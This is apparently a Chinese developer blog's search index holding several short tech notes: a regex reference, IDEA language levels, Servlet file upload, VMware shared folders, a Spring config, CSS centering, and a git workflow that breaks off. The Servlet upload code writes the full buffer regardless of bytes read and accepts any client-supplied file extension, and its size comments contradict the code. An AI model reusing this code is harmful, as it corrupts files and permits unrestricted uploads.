<td>匹配一个换页符。等价于 \x0c 和 \cL。</td>
</tr>
<tr>
<td><strong>\n</strong></td>
<td>匹配一个换行符。等价于 \x0a 和 \cJ。</td>
</tr>
<tr>
<td><strong>\r</strong></td>
<td>匹配一个回车符。等价于 \x0d 和 \cM。</td>
</tr>
<tr>
<td><strong>\s</strong></td>
<td>匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。</td>
</tr>
<tr>
<td><strong>\t</strong></td>
<td>匹配一个制表符。等价于 \x09 和 \cI。</td>
</tr>
<tr>
<td><strong>\S</strong></td>
<td>匹配任何非空白字符。等价于[^ \f\n\r\t\v]。</td>
</tr>
<tr>
<td><strong>\v</strong></td>
<td>匹配一个垂直制表符。等价于 \x0b 和 \cK。</td>
</tr>
</tbody></table>
<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><table>
<thead>
<tr>
<th>特别字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>$</strong></td>
<td>匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。</td>
</tr>
<tr>
<td><strong>( )</strong></td>
<td>标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td>
</tr>
<tr>
<td>*****</td>
<td>匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 *。</td>
</tr>
<tr>
<td><strong>+</strong></td>
<td>匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</td>
</tr>
<tr>
<td><strong>.</strong></td>
<td>匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。</td>
</tr>
<tr>
<td>[</td>
<td>标记一个中括号表达式的开始。要匹配 [，请使用 [。</td>
</tr>
<tr>
<td><strong>?</strong></td>
<td>匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</td>
</tr>
<tr>
<td>*<em>*</em></td>
<td>将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
</tr>
<tr>
<td><strong>^</strong></td>
<td>匹配输入字符串的开始位置，除非在方括号表达式中使用，当该符号在方括号表达式中使用时，表示不接受该方括号表达式中的字符集合。要匹配 ^ 字符本身，请使用 ^。</td>
</tr>
<tr>
<td><strong>{</strong></td>
<td>标记限定符表达式的开始。要匹配 {，请使用 {。</td>
</tr>
<tr>
<td><strong>|</strong></td>
<td>指明两项之间的一个选择。要匹配 |，请使用 |。</td>
</tr>
</tbody></table>
<h3 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h3><p>指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>*****</td>
<td>匹配前面的子表达式零次或多次。</td>
</tr>
<tr>
<td><strong>+</strong></td>
<td>匹配前面的子表达式一次或多次。</td>
</tr>
<tr>
<td><strong>?</strong></td>
<td>匹配前面的子表达式零次或一次。</td>
</tr>
<tr>
<td><strong>{n}</strong></td>
<td>n 是一个非负整数。匹配确定的 <strong>n</strong> 次。</td>
</tr>
<tr>
<td><strong>{n,}</strong></td>
<td>n 是一个非负整数。至少匹配n 次。</td>
</tr>
<tr>
<td><strong>{n,m}</strong></td>
<td>m 和 n 均为非负整数，其中 n &lt;= m。最少匹配 n 次且最多匹配 m 次。</td>
</tr>
</tbody></table>
<h3 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h3><table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>^</strong></td>
<td>匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。</td>
</tr>
<tr>
<td><strong>$</strong></td>
<td>匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。</td>
</tr>
<tr>
<td><strong>\b</strong></td>
<td>匹配一个单词边界，即字与空格间的位置。</td>
</tr>
<tr>
<td><strong>\B</strong></td>
<td>非单词边界匹配。</td>
</tr>
</tbody></table>
<blockquote>
<p>注：不能将限定符与定位符一起使用。由于在紧靠换行或者单词边界的前面或后面不能有一个以上位置，因此不允许诸如 <strong>^*</strong> 之类的表达式。</p>
</blockquote>
<h3 id="选择-捕获组"><a href="#选择-捕获组" class="headerlink" title="选择+捕获组"></a>选择+捕获组</h3><p>用圆括号 <strong>()</strong> 将所有选择项括起来，相邻的选择项之间用 <strong>|</strong> 分隔。</p>
<p><strong>()</strong> 表示<strong>捕获分组</strong>，**()** 会把每个分组里的匹配的值保存起来， 多个匹配值可以通过数字 n 来查看(<strong>n</strong> 是一个数字，表示第 n 个捕获组的内容)。</p>
<h3 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h3><hr>
<p><strong>选择</strong>和<strong>反向引用</strong>待学习补充</p>
<hr>
<h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><p>标记也称为修饰符，正则表达式的标记用于指定额外的匹配策略。</p>
<p>标记不写在正则表达式里，标记位于表达式之外，格式如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/pattern/flags</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>修饰符</th>
<th>含义</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><strong>i</strong></td>
<td>ignore - 不区分大小写</td>
<td>将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td>
</tr>
<tr>
<td>g</td>
<td>global - 全局匹配</td>
<td>查找所有的匹配项。</td>
</tr>
<tr>
<td><strong>m</strong></td>
<td>multi line - 多行匹配</td>
<td>使边界字符 <strong>^</strong> 和 <strong>$</strong> 匹配每一行的开头和结尾，记住是多行，而不是整个字符串的开头和结尾。</td>
</tr>
<tr>
<td>s</td>
<td>特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td>
<td>默认情况下的圆点 <strong>.</strong> 是匹配除换行符 <strong>\n</strong> 之外的任何字符，加上 <strong>s</strong> 修饰符之后, <strong>.</strong> 中包含换行符 \n。</td>
</tr>
</tbody></table>
<h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><p>直接参见：<a href="https://www.runoob.com/regexp/regexp-metachar.html">正则表达式 – 元字符 | 菜鸟教程 (runoob.com)</a></p>
]]></content>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>SDK、Language Level和Compiler version</title>
    <url>/2022/02/26/SDK%E3%80%81Language%20Level%E5%92%8CCompiler%20version/</url>
    <content><![CDATA[<h2 id="SDK、Language-Level是什么？"><a href="#SDK、Language-Level是什么？" class="headerlink" title="SDK、Language Level是什么？"></a>SDK、Language Level是什么？</h2><span id="more"></span>

<p>在Project和Module两个级别中，都可以设置各自的SDK版本和Language Level版本。</p>
<h3 id="①SDK"><a href="#①SDK" class="headerlink" title="①SDK"></a>①SDK</h3><p>​        <strong>SDK：</strong>首先介绍一下SDK，SDK就是指工程Project（模块Module）所依赖的依赖库，在java中一般就是指JDK（可以说JDK就是SDK的一种）。</p>
<h3 id="②Language-Level"><a href="#②Language-Level" class="headerlink" title="②Language Level"></a>②Language Level</h3><p>​        <strong>Language Level：</strong>再介绍一下Language Level，（似乎只有IDEA中出现了这个，而在其他IDE中并没有这个）。Language Level，就是指在进行编程的时候，代码的语法的版本级别。</p>
<p>​        例如：虽然我所引入的SDK是JDK11，但是公司中使用的是JDK8，那么，为了代码在自己电脑和上传服务器后都能正常运行，可以将language level调至jdk8</p>
<p>​        （换一句话说，我引入的是JDK11，但是我只用到其中的JDK8的语法）</p>
<p><strong>一图胜千言！</strong></p>
<p><img src="https://s2.loli.net/2022/02/26/iGdVSUExQAKz4Bp.png" alt="image-20220226224206968"></p>
<h3 id="③Compiler-version"><a href="#③Compiler-version" class="headerlink" title="③Compiler version"></a>③Compiler version</h3><p>​        Compiler version指的是项目build之后的生成文件中所使用的语言版本。</p>
<p>​        事实上，IDEA中并没有这个东西。但是为了将上面两个理解的更完整，我将Java Compiler中的project bytecode version也拿出来讲一下。</p>
<p><img src="https://s2.loli.net/2022/02/26/JknpmqrXgTEu23W.png" alt="image-20220226223919348"></p>
<p>​        可以看到，默认是和Language Level相同等级。而在上图下面的Module中同样可以设置每个Module自己所要编译生成的模块所依赖的语言版本。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​        其实，Language Level和Compiler version这两个的存在，就是为了让项目发布后，能够更好的兼容、更好的运行。</p>
<p>​        SDK：编代码时导入的版本（<strong>用不用还不一定</strong>）</p>
<p>​        Language Level：在编写代码时实际使用的版本（<strong>为了方便compile之后，兼容服务器或公司的版本</strong>）</p>
<p>​        Compiler version：build打包生成的依赖版本（一般和Language一样）（<strong>服务器或公司的版本一定要大于等于这个版本，即运行生成文件的环境的版本要大于等于这个版本</strong>）</p>
]]></content>
      <tags>
        <tag>配置</tag>
      </tags>
  </entry>
  <entry>
    <title>Servlet文件上传</title>
    <url>/2021/10/23/Servlet%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h2 id="Servlet实现文件上传"><a href="#Servlet实现文件上传" class="headerlink" title="Servlet实现文件上传"></a>Servlet实现文件上传</h2><span id="more"></span>

<p>由于步骤相对比较固定，所以本文只记录核心步骤，其他步骤一般可以想出来，想不出来去翻这一篇博客：<a href="https://www.cnblogs.com/th11/p/15102759.html">servlet-文件上传-狂神笔记 - 你我不在年少 - 博客园 (cnblogs.com)</a></p>
<p><img src="https://i.loli.net/2021/10/23/vRdYaOitK4ADVuP.png" alt="Servlet实现文件上传.drawio"></p>
<h3 id="步骤一：导入包"><a href="#步骤一：导入包" class="headerlink" title="步骤一：导入包"></a>步骤一：导入包</h3><p>①commons-io依赖</p>
<p>②commons-fileupload依赖</p>
<p><img src="https://i.loli.net/2021/10/23/GNUp3yojSxtHuez.png" alt="image-20211023120138825"></p>
<h3 id="步骤二：获取DiskFileItemFactory对象"><a href="#步骤二：获取DiskFileItemFactory对象" class="headerlink" title="步骤二：获取DiskFileItemFactory对象"></a>步骤二：获取DiskFileItemFactory对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取DiskFileItemFactory对象</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> tempfile 文件临时存储路径</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> DiskFileItemFactory <span class="title">getDiskFileItemFactory</span><span class="params">(File tempfile)</span> </span>&#123;</span><br><span class="line">    DiskFileItemFactory factory = <span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//文件大于2M，由内存转存到临时文件中</span></span><br><span class="line">    factory.setSizeThreshold(<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">2</span>);</span><br><span class="line">    <span class="comment">//临时文件存储路径</span></span><br><span class="line">    factory.setRepository(tempfile);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="步骤三：获取ServletFileUpload对象"><a href="#步骤三：获取ServletFileUpload对象" class="headerlink" title="步骤三：获取ServletFileUpload对象"></a>步骤三：获取ServletFileUpload对象</h3><p><strong>构造方法中可以传入步骤二中获取到的DiskFileItemFactory对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 获取ServletFileUpload对象</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> factory</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ServletFileUpload <span class="title">getServletFileUpload</span><span class="params">(DiskFileItemFactory factory)</span> </span>&#123;</span><br><span class="line">    ServletFileUpload upload = <span class="keyword">new</span> ServletFileUpload(factory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取单个部分标题时，设置编码格式</span></span><br><span class="line">    upload.setHeaderEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    <span class="comment">//单个文件最大20M</span></span><br><span class="line">    upload.setFileSizeMax(<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">100</span>);</span><br><span class="line">    <span class="comment">//最多上传20M</span></span><br><span class="line">    upload.setSizeMax(<span class="number">1024</span> * <span class="number">1024</span> * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//监听上传进程</span></span><br><span class="line">    upload.setProgressListener(<span class="keyword">new</span> ProgressListener() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">long</span> pBytesRead, <span class="keyword">long</span> pContentLength, <span class="keyword">int</span> pItems)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//计算百分比</span></span><br><span class="line">            <span class="comment">//                double percentResult = (pBytesRead / (double) pContentLength);</span></span><br><span class="line">            System.out.println(<span class="string">&quot;总大小：&quot;</span> + pContentLength + <span class="string">&quot;    已上传&quot;</span> + pBytesRead);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> upload;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="步骤三：解析请求，获取文件，返回结果"><a href="#步骤三：解析请求，获取文件，返回结果" class="headerlink" title="步骤三：解析请求，获取文件，返回结果"></a>步骤三：解析请求，获取文件，返回结果</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解析请求并返回结果</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">parseUploadRequest</span><span class="params">(HttpServletRequest request, ServletFileUpload upload, String uploadPath)</span> <span class="keyword">throws</span> FileUploadException, IOException </span>&#123;</span><br><span class="line">    List&lt;FileItem&gt; fileItems = upload.parseRequest(request);</span><br><span class="line">    String msg = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (FileItem fileItem : fileItems) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileItem.isFormField()) &#123;</span><br><span class="line">            <span class="comment">//如果是简单的表单字段，返回true；如果代表上传的文件，返回false</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (fileItem.getName().trim().equals(<span class="string">&quot;&quot;</span>) || fileItem.getName() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//文件名不合乎规则</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//文件名</span></span><br><span class="line">                String uploadFileName = fileItem.getName();</span><br><span class="line">                System.out.println(<span class="string">&quot;uploadFileName&quot;</span> + uploadFileName);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//一般uploadFileName是单纯的文件名，但有些浏览器也会把路径给带上去，所以这里要再过滤一下</span></span><br><span class="line">                <span class="comment">//lastindexof找不到返回-1</span></span><br><span class="line">                <span class="comment">//substring从下标0开始</span></span><br><span class="line">                String fileName = uploadFileName.substring(uploadFileName.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;fileName:&quot;</span> + fileName);</span><br><span class="line">                <span class="comment">//后缀名</span></span><br><span class="line">                String fileExtName = uploadFileName.substring(uploadFileName.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;fileExtName:&quot;</span> + fileExtName);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//输出到服务器上</span></span><br><span class="line">                <span class="comment">//可能需要用到UUID</span></span><br><span class="line">                InputStream inputStream = fileItem.getInputStream();</span><br><span class="line">                <span class="comment">//                FileOutputStream fos = new FileOutputStream(uploadPath + &quot;/&quot; + fileName + &quot;.&quot; + fileExtName);</span></span><br><span class="line">                <span class="comment">//使用UUID确保文件名唯一性</span></span><br><span class="line">                String uuidStirng = UUID.randomUUID().toString();</span><br><span class="line">                FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(uploadPath + <span class="string">&quot;/&quot;</span> + uuidStirng + <span class="string">&quot;.&quot;</span> + fileExtName);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (inputStream.read(buffer) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    fos.write(buffer);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                fos.flush();</span><br><span class="line">                fos.close();</span><br><span class="line"></span><br><span class="line">                inputStream.close();</span><br><span class="line">                msg = <span class="string">&quot;文件上传成功&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        fileItem.delete();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>步骤相对固定。但其中还会有些许其他小技巧，如：获取文件名、借助UUID编号保持文件名唯一性。</p>
]]></content>
      <tags>
        <tag>Servlet</tag>
        <tag>文件上传</tag>
        <tag>UUID</tag>
      </tags>
  </entry>
  <entry>
    <title>VMware中的虚拟机与宿主机的文件共享</title>
    <url>/2021/06/10/VMware%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9A%84%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/</url>
    <content><![CDATA[<h2 id="简要说明"><a href="#简要说明" class="headerlink" title="简要说明"></a>简要说明</h2><span id="more"></span>

<h3 id="目前我知道的有如下几种方法"><a href="#目前我知道的有如下几种方法" class="headerlink" title="目前我知道的有如下几种方法"></a>目前我知道的有如下几种方法</h3><ol>
<li>使用VMware Tools（这种方法功能很多，具体见下图，但由于本人尝试过很次，总是出现一些问题，所以本文暂不对此方法进行说明，等以后空闲时间在尝试摸索一番）</li>
<li>使用U盘（此方法较为简单，只是需要借助一个U盘）</li>
<li>建立共享文件夹（此方法也很简单，不需要借助其它设备，也不需要下载其他软件、插件）</li>
</ol>
<h2 id="建立共享文件夹——方法阐述"><a href="#建立共享文件夹——方法阐述" class="headerlink" title="建立共享文件夹——方法阐述"></a>建立共享文件夹——方法阐述</h2><h3 id="步骤解析（来一波图片！）"><a href="#步骤解析（来一波图片！）" class="headerlink" title="步骤解析（来一波图片！）"></a>步骤解析（来一波图片！）</h3><p><img src="https://i.loli.net/2021/06/10/xBfFhSciIqE3QuC.png" alt="屏幕截图 2021-06-10 232743.png"></p>
<p><img src="https://i.loli.net/2021/06/10/8zA1hcRYtsSlqkX.png" alt="屏幕截图 2021-06-10 232628.png"></p>
<p>下面这张图里选择的文件夹可以自己新建一个，比如就命名为“虚拟机共享文件夹”</p>
<p><img src="https://i.loli.net/2021/06/10/avGApILn6HzRd5T.png" alt="屏幕截图 2021-06-10 232931.png"><br><img src="https://i.loli.net/2021/06/10/HPwhbdTkRf1XGVK.png" alt="屏幕截图 2021-06-10 233006.png"></p>
<p>下面这张图里，根据个人所需设置，后期可以随时修改</p>
<p><img src="https://i.loli.net/2021/06/10/KSz2lj5fxg1OYGQ.png" alt="屏幕截图 2021-06-10 233033.png"></p>
<h3 id="虚拟机查看路径"><a href="#虚拟机查看路径" class="headerlink" title="虚拟机查看路径"></a>虚拟机查看路径</h3><p>在虚拟机里默认保存的地点路径如下：（再来一波图！）<br><img src="https://i.loli.net/2021/06/10/OBQWMaYqED7esdn.png" alt="屏幕截图 2021-06-10 233146.png"><br><img src="https://i.loli.net/2021/06/10/lf6HQ5ZSW7obnm2.png" alt="屏幕截图 2021-06-10 233212.png"><br><img src="https://i.loli.net/2021/06/10/tsArNLxDKh8vm7I.png" alt="屏幕截图 2021-06-10 233231.png"><br><img src="https://i.loli.net/2021/06/10/AijaIbQu5tCVLYk.png" alt="屏幕截图 2021-06-10 233246.png"></p>
<p><strong>共享的文件夹的路径是：/mnt/hgfs</strong></p>
<p>好了，下面虚拟机和宿主机就可以通过这个文件夹进行信息、文件等交流啦！</p>
]]></content>
  </entry>
  <entry>
    <title>Spring的核心配置模板</title>
    <url>/2021/11/06/Spring%E7%9A%84%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="Spring的application-xml配置模板"><a href="#Spring的application-xml配置模板" class="headerlink" title="Spring的application.xml配置模板"></a>Spring的application.xml配置模板</h2><span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">                           https://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/aop</span></span></span><br><span class="line"><span class="tag"><span class="string">                           https://www.springframework.org/schema/aop/spring-aop.xsd </span></span></span><br><span class="line"><span class="tag"><span class="string">                           http://www.springframework.org/schema/context </span></span></span><br><span class="line"><span class="tag"><span class="string">                           https://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--指定注解扫描包--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.lry.pojo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--开启属性注解支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--aop的注解支持--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--注册Bean--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;diy&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lry.diy.DiyPointCut&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;userService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.lry.service.UserServiceImpl&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--第一种方式：通过Spring API实现--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--aop的配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--切入点：expression：表达式匹配要拦截的方法：--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        execution(modifiers-pattern? ret-type-pattern declaring-type-pattern?name-pattern(param-pattern) throws-pattern?)</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointcut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.lry.service.UserServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--执行环绕; advice-ref执行方法 . pointcut-ref切入点--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;beforeLog&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;afterLog&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--第二种方式：自定义类来实现AOP--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--aop的配置--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;diy&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;pointCut&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* com.lry.service.UserServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;before&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointCut&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;after&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointCut&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>配置模板</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10+Ubuntu双系统安装教程</title>
    <url>/2022/01/08/Win10-Ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="双系统安装教程"><a href="#双系统安装教程" class="headerlink" title="双系统安装教程"></a>双系统安装教程</h2><span id="more"></span>

<p><strong>链接：<a href="https://pan.baidu.com/s/196WaNTewLsoKamzcz_CI3w">https://pan.baidu.com/s/196WaNTewLsoKamzcz_CI3w</a></strong><br><strong>提取码：1111</strong></p>
]]></content>
      <tags>
        <tag>双系统</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>css设置div垂直水平居中</title>
    <url>/2021/12/23/css%E8%AE%BE%E7%BD%AEdiv%E5%9E%82%E7%9B%B4%E6%B0%B4%E5%B9%B3%E5%B1%85%E4%B8%AD/</url>
    <content><![CDATA[<h2 id="CSS设置div垂直水平居中"><a href="#CSS设置div垂直水平居中" class="headerlink" title="CSS设置div垂直水平居中"></a>CSS设置div垂直水平居中</h2><span id="more"></span>

<p><strong>第一种：</strong></p>
<p>position: absolute;<br>margin:auto;<br>top: 0;<br>left: 0;<br>right: 0;<br>bottom: 0；</p>
<hr>
<p><strong>第二种：</strong></p>
<p>position:absolute;<br>top:50%;<br>left:50%;<br>transform: translate(-50%,-50%);//通过变形来搞定</p>
<hr>
<p><strong>第三种：</strong></p>
<p>display: flex;<br>flex-direction: column;//column、row定义项目的排列方向<br>justify-content: center;<br>align-items: center;</p>
<hr>
<p><strong>第四种：</strong></p>
<p>position:absolute;<br>left:0;<br>top: 0;<br>bottom: 0;<br>right: 0;<br>margin: auto;</p>
]]></content>
      <tags>
        <tag>前端</tag>
        <tag>CSS样式</tag>
      </tags>
  </entry>
  <entry>
    <title>git提交项目到github</title>
    <url>/2022/01/04/git%E6%8F%90%E4%BA%A4%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="Git操作步骤"><a href="#Git操作步骤" class="headerlink" title="Git操作步骤"></a>Git操作步骤</h2><span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">初始化-&gt;绑定远程仓库-&gt;拉取最新版本(merge)-&gt;提交到暂存区-&gt;push到远程仓库</span><br></pre></td></tr></table></figure>

<p><strong>初始化：</strong><code>git init</code></p>
<blockquote>
